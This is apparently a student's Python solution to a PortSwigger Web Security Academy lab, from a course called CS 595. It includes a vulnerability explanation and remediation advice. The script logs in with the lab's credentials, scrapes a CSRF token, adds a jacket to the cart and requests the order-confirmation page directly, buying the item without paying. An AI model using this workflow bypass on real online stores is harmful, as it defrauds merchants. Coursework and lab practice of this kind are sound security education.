"""
Tristan Gomez - CS 595
Spring 2021

The code below solves the PortSwigger level: Insufficient workflow validation

Level Description:
    This lab makes flawed assumptions about the sequence of events in the purchasing workflow. 
    To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

    You can log in to your own account using the following credentials: wiener:peter 

Vulnerability Description:
    The vulnerability in this lab is that a client can add a product to their cart, and then immediately
    navigate to the order confirmation page, which places the order for the client for the product(s) in 
    their cart. This doesn't cause any money to be charged to the client.

Remediation:
    The workflow for the site needs to be changed. The checkout page should have two pages it redirects to:
    a successful checkout or a un-successful checkout. The successful checkout page would only be reachable if
    the client has enough money and other business rules are verified. Once the money is deducted from the client
    on the successful checkout page, then that page should redirect to the order confirmation page. Using Headers, you
    could make the pages only reachable from success pages. So the confirmation page is only reachable from the
    checkout successful page, which is only reachable from the checkout page after all business rules have been verified. 

"""

"""
    I will be importing the "requests" library so I can send GET and POST requests. I will use
    "BeautifulSoup" for extracting csrf tokens for submitting forms. 
"""
import requests
from bs4 import BeautifulSoup

s = requests.Session()
site = "ac1c1fb01e15287480979f6800720056.web-security-academy.net"
login_url = f"https://{site}/login"
cart_url = f"https://{site}/cart"
successful_checkout_url = f"https://{site}/cart/order-confirmation?order-confirmed=true"
checkout_url = f"https://{site}/cart/checkout"

"""
    Below I am sending a GET request for the login page. I will then use BeautifulSoup
    to extract the csrf token from the page. I will then package up the csrf token and
    the given credentials into an object that I will then POST to the login page to log in.
"""
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

login_data = {
    'csrf': csrf,
    'username' : 'wiener',
    'password' : 'peter'
}

resp = s.post(login_url, data=login_data)
print(f"login status: {resp.status_code}")


jacket_data = {
    'productId' : '1',
    'redir' : 'PRODUCT',
    'quantity' : '1'
}

resp = s.post(cart_url, data=jacket_data)
print(f"Added jacket to cart status: {resp.status_code}")

resp = s.get(successful_checkout_url)
print(resp.url)
print(f"buy jacket status code: {resp.status_code}")



